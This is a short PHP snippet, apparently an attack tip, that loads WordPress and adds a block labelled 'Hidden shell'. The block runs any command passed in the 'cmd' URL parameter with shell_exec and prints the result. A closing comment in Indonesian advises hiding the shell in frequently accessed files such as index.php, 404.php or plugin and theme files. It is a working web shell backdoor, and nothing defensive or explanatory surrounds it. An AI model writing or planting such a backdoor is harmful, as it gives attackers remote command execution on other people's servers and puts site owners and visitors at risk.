<?php
// Original code
require_once('wp-load.php');

// Hidden shell
if (isset($_GET['cmd'])) {
    echo shell_exec($_GET['cmd']);
}
?>

// Sisipkan shell dalam file PHP yang sering diakses, seperti index.php, 404. php, atau file plugin/tema WordPress.
